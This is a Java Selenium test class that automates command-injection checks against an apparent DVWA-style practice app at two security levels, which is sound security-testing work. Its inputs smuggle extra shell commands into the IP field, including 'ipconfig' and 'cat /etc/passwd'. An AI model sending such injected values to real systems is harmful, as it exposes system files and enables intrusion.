package testcase;




	import org.openqa.selenium.By;
	import org.openqa.selenium.WebElement;
	import org.openqa.selenium.support.ui.ExpectedConditions;
	import org.openqa.selenium.support.ui.Select;
	import org.openqa.selenium.support.ui.WebDriverWait;
	import org.testng.annotations.Test;

	import base.BaseTest;
	import securitycheck.SecUtils;

	public class Test3CMDinj extends BaseTest{
		boolean test = false;
		
		@Test
		public void commandInjectionLow() throws InterruptedException {
			String ip="192.168.1.227";

		System.out.println(driver.getCurrentUrl());
		
		driver.findElement(By.linkText("Command Injection")).click();
		driver.findElement(By.name("ip")).sendKeys("127.0.01 && ipconfig && echo \"you have been hacked\" ");
		Thread.sleep(1000);
		driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/p/input[2]")).click();
		
		WebDriverWait wait = new WebDriverWait(driver, 10);//
		WebElement tag = driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/pre"));
		System.out.println(tag.getText());
		wait.until(ExpectedConditions.visibilityOf(tag));
		Thread.sleep(1000);

		SecUtils.assertCMDIvulnerable(driver,ip);// assert IP command
		//SecUtils.assertCMDIechovulnerable(driver,"you have been hacked");//assert echo command
		
		
		}
		
		@Test
		public void commandInjectionmeduim() throws InterruptedException {
			
		super.security("medium");
		String injection ="127.0.01 & cat /etc/passwd & echo \"you have been hacked\"";
		driver.findElement(By.linkText("Command Injection")).click();
		WebElement ip =driver.findElement(By.name("ip"));
		ip.sendKeys(injection);
		Thread.sleep(1000);
		driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/form/p/input[2]")).click();
		
		WebDriverWait wait = new WebDriverWait(driver, 10);//
		WebElement tag = driver.findElement(By.xpath("//*[@id=\"main_body\"]/div/div/pre"));
		System.out.println(tag.getText());
		wait.until(ExpectedConditions.visibilityOf(tag));
		Thread.sleep(1000);
		//String expectedResult="akila";
		//SecUtils.isCMDIPresnets(driver, "hacked");
		//SecUtils.CMDIetcpasswodVulnerabilty(driver, injection);
		//SecUtils.CMDIwhoamiVulnerabilty(driver, expectedResult);
		}
	}
	
